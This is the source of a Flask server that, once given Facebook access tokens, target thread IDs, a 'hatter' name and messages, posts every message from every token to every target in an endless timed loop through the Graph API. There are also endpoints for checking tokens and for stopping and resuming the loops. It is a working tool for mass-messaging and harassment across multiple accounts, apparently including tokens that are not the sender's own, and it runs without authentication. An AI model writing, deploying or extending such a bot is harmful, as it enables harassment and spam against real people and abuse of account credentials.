from flask import Flask, request, jsonify
import requests
import threading
import time

app = Flask(__name__)
active_convos = {}

# ✅ Validate Facebook Token
@app.route("/validate_id", methods=["POST"])
def validate_id():
    data = request.json
    token = data.get("token")
    try:
        res = requests.get(f"https://graph.facebook.com/me?access_token={token}")
        info = res.json()
        if "id" in info:
            return jsonify({"valid": True, "id": info["id"], "name": info["name"]})
        else:
            return jsonify({"valid": False})
    except:
        return jsonify({"valid": False})

# ✅ Start New Conversation
@app.route("/start_convo", methods=["POST"])
def start_convo():
    data = request.json
    convo_name = data["convo_name"]
    tokens = data["tokens"]
    ids = data["ids"]
    hatter = data["hatter"]
    messages = data["messages"]
    delay = float(data["delay"])
    
    def send_loop():
        while convo_name in active_convos:
            for token in tokens:
                for uid in ids:
                    for msg in messages:
                        try:
                            final_msg = f"{hatter} : {msg}"
                            url = f"https://graph.facebook.com/v15.0/t_{uid}/messages"
                            payload = {
                                "message": final_msg,
                                "access_token": token
                            }
                            response = requests.post(url, data=payload)
                            print(f"[{uid}] {final_msg} → {response.status_code}")
                        except Exception as e:
                            print(f"[ERROR] {e}")
                        time.sleep(delay)
            time.sleep(delay)

    # Start thread
    active_convos[convo_name] = True
    threading.Thread(target=send_loop).start()
    return jsonify({"status": "started"})

# ✅ Stop Conversation
@app.route("/stop_convo", methods=["POST"])
def stop_convo():
    convo_name = request.json["convo_name"]
    if convo_name in active_convos:
        del active_convos[convo_name]
        return jsonify({"status": "stopped"})
    return jsonify({"status": "not found"})

# ✅ Resume Conversation
@app.route("/resume_convo", methods=["POST"])
def resume_convo():
    # For simplicity: same as start_convo but does not re-validate
    return start_convo()

# ✅ View Active Convos
@app.route("/view_convo", methods=["GET"])
def view_convo():
    return jsonify({"active_convos": list(active_convos.keys())})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
